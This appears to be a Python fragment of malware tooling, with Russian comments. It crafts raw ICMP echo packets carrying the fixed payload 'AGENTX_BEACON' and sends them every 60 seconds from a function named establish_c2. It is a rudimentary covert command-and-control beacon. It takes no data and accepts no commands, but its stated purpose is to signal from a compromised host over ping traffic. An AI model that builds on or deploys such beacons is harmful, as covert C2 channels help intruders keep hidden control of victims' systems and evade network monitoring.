import os
import socket
import struct
import time

def icmp_beacon(target_ip="8.8.8.8", interval=60):
    # Отправляет ICMP Echo Request (ping) с кастомным payload
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print("[COMMS] ICMP requires root/admin rights!")
        return
    pid = os.getpid() & 0xFFFF
    seq = 1
    while True:
        # ICMP Echo Request: Type=8, Code=0
        header = struct.pack('!BBHHH', 8, 0, 0, pid, seq)
        payload = b'AGENTX_BEACON'
        checksum = icmp_checksum(header + payload)
        header = struct.pack('!BBHHH', 8, 0, checksum, pid, seq)
        packet = header + payload
        sock.sendto(packet, (target_ip, 0))
        print(f"[COMMS] ICMP beacon sent to {target_ip} seq={seq}")
        seq += 1
        time.sleep(interval)

def icmp_checksum(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data)-n, 2):
        s += (data[i] << 8) + data[i+1]
    if n:
        s += (data[-1] << 8)
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    s = ~s & 0xFFFF
    return s

def establish_c2():
    # Запускает ICMP beacon
    icmp_beacon()
